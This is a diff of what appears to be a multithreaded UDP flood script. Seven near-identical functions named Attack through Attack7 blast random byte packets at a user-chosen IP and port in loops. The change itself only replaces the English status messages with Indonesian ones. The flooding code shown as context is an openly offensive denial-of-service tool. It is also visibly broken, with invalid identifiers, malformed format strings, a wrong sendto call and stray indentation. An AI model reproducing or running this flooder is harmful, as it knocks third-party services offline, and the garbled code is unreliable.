@@ -120,10 +120,10 @@ def Attack():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K_ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack2():
 	K_ibytes = random._urandom(3451)
@@ -135,10 +135,10 @@ def Attack2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K_ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 
 def Attack3():
 	K_ibytes = random._urandom(3451)
@@ -150,10 +150,10 @@ def Attack3():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K_ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 
 def Attack4():
 	K_ibytes = random._urandom(3451)
@@ -165,10 +165,10 @@ def Attack4():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K_ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			 print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 
 def Attack5():
 	K_ibytes = random._urandom(3451)
@@ -180,10 +180,10 @@ def Attack5():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K_ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 
 def Attack6():
 	K-ibytes = random._urandom(3451)
@@ -195,10 +195,10 @@ def Attack6():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K-ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 			
 def Attack7():
 	K-ibytes = random._urandom(3451)
@@ -210,11 +210,10 @@ def Attack7():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				sock.sendto(K-ibytes,addr,data)
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
+			 print(M +"MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 		except:
 			sock.close()
-			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-			
+			print(" [K] MENGIRIM KOPI DAN KE PORT % %"(ip(str,port))
 for y in range(threads):
 	if choice == 'Attack':
 			th = threading.Thread(target = Attack)
